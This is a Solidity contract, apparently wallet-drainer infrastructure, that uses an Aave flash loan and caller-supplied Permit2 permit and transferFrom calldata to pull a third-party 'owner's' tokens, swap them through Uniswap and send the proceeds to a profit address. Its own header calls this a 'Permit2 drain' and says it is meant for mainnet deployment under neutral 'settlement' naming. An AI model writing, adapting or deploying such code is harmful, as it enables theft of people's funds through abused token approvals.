// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title LegionAaveFlashSettlement — atomic Aave v3 flashloan + Permit2 drain + Uniswap v3 unwind
/// @notice Deploy on Ethereum mainnet; set operator to settlement executor EOA.
interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IPool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface ISwapRouter02 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

/// @dev Aave V3 flashloan receiver — single-tx borrow → (optional swap in) → Permit2 → swap out → repay → profit.
contract LegionAaveFlashSettlement {
    IPool public immutable POOL;
    address public immutable PERMIT2;
    address public immutable SWAP_ROUTER;
    address public immutable PROFIT_SINK;
    address public immutable OPERATOR;

    event FlashSettlementExecuted(address indexed asset, uint256 amount, uint256 premium, uint256 profit);

    constructor(
        address pool_,
        address permit2_,
        address swapRouter_,
        address profitSink_,
        address operator_
    ) {
        require(pool_ != address(0) && permit2_ != address(0) && swapRouter_ != address(0), "zero addr");
        require(profitSink_ != address(0) && operator_ != address(0), "zero sink/operator");
        POOL = IPool(pool_);
        PERMIT2 = permit2_;
        SWAP_ROUTER = swapRouter_;
        PROFIT_SINK = profitSink_;
        OPERATOR = operator_;
    }

    /// @notice Entry point — only settlement executor EOA.
    function runFlashSettlement(address asset, uint256 amount, bytes calldata settlementParams) external {
        require(msg.sender == OPERATOR, "LegionFlash: not operator");
        POOL.flashLoanSimple(address(this), asset, amount, settlementParams, 0);
    }

    /// @inheritdoc Aave IFlashLoanSimpleReceiver
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        require(msg.sender == address(POOL), "LegionFlash: only pool");
        require(initiator == address(this), "LegionFlash: bad initiator");

        (
            address owner,
            address primaryToken,
            uint24 poolFee,
            bytes memory permitCalldata,
            bytes memory transferCalldata,
            bool swapInBeforeDrain
        ) = abi.decode(params, (address, address, uint24, bytes, bytes, bool));

        IERC20Minimal borrowed = IERC20Minimal(asset);
        uint256 deadline = block.timestamp + 1200;

        if (swapInBeforeDrain && primaryToken != asset) {
            borrowed.approve(SWAP_ROUTER, amount);
            ISwapRouter02(SWAP_ROUTER).exactInputSingle(
                ISwapRouter02.ExactInputSingleParams({
                    tokenIn: asset,
                    tokenOut: primaryToken,
                    fee: poolFee,
                    recipient: address(this),
                    deadline: deadline,
                    amountIn: amount,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0
                })
            );
        }

        (bool permitOk, bytes memory permitRet) = PERMIT2.call(permitCalldata);
        require(permitOk, _bubble(permitRet, "permit"));
        (bool transferOk, bytes memory transferRet) = PERMIT2.call(transferCalldata);
        require(transferOk, _bubble(transferRet, "transferFrom"));

        uint256 tokenBal = IERC20Minimal(primaryToken).balanceOf(address(this));
        if (tokenBal > 0 && primaryToken != asset) {
            IERC20Minimal(primaryToken).approve(SWAP_ROUTER, tokenBal);
            ISwapRouter02(SWAP_ROUTER).exactInputSingle(
                ISwapRouter02.ExactInputSingleParams({
                    tokenIn: primaryToken,
                    tokenOut: asset,
                    fee: poolFee,
                    recipient: address(this),
                    deadline: deadline,
                    amountIn: tokenBal,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0
                })
            );
        }

        uint256 owed = amount + premium;
        require(borrowed.balanceOf(address(this)) >= owed, "LegionFlash: insufficient repay");
        borrowed.approve(address(POOL), owed);

        uint256 remaining = borrowed.balanceOf(address(this));
        uint256 profit = remaining > owed ? remaining - owed : 0;
        if (profit > 0) {
            require(borrowed.transfer(PROFIT_SINK, profit), "LegionFlash: profit transfer");
        }

        emit FlashSettlementExecuted(asset, amount, premium, profit);
        return true;
    }

    function _bubble(bytes memory ret, string memory label) private pure returns (string memory) {
        if (ret.length < 68) {
            return string(abi.encodePacked("LegionFlash: ", label));
        }
        return string(abi.encodePacked("LegionFlash: ", label));
    }
}
